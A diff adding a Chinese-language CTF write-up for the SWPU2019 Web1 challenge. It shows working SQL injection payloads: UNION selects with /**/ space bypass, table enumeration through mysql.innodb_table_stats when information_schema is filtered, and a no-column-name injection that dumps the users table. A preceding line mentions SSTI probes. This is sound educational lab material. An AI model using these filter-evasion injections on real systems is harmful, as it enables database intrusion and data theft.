@@ -1117,3 +1117,33 @@ if __name__ == '__main__':
 其实这里如果没有过滤config的话，就直接`{{config}}`获取，没有过滤`self`的话也可以通过`{{self.__dict__}}`，没有过滤括号的话，还能用base object通过os读取环境变量来获得  
 
 得到flag
+
+----
+# [SWPU2019]Web1
+打开是一个登陆页面，简单测试了登录和注册没有注入，然后注册admin显示已有该用户，于是注册一个正常账户，发现是一个广告发布页面，点击发布广告，输入`#`，提示标题含有敏感词汇，于是判断是在此注入。测试发现会删除空格。然后就不知道怎么操作了，看着一大堆东西懵逼。翻了wp才知道原来要点进广告详情才会有显示的qaq。然后我们使用`/**/`绕过空格，并在最后使用单引号闭合，`order by`也是不能使用了。
+```
+1'union/**/select/**/1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22'
+```
+尼玛22个字段，在此问候出题人。正当我以为已经可以注入的时候，发现`information_schema`竟然被过滤了，淦，查阅资料后发现有替代的方法：
+```
+-1'/**/union/**/select/**/1,(select/**/group_concat(table_name)/**/from/**/sys.schema_auto_increment_colum ns/**/where/**/table_schema=schema()),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,'22
+```
+本以为已经完美解决，没有想到：
+```
+Table 'sys.schema_auto_increment_columns' doesn't exist
+```
+wtf，看来得试试另一种方法，看了看innodb也是可以查到表名的：
+```
+-1'/**/union/**/select/**/1,(select/**/group_concat(table_name)/**/from/**/mysql.innodb_table_stats/**/where/**/database_name=database()),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,'22
+```
+得到表名：
+```
+ads,users
+```
+接着无列名注入：
+```
+-1'/**/union/**/select/**/1,(select/**/group_concat(b)/**/from/**/(select/**/1,2,3/**/as/**/b/**/union/**/select*from/**/users)a),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,'22
+```
+得到flag
+
+----
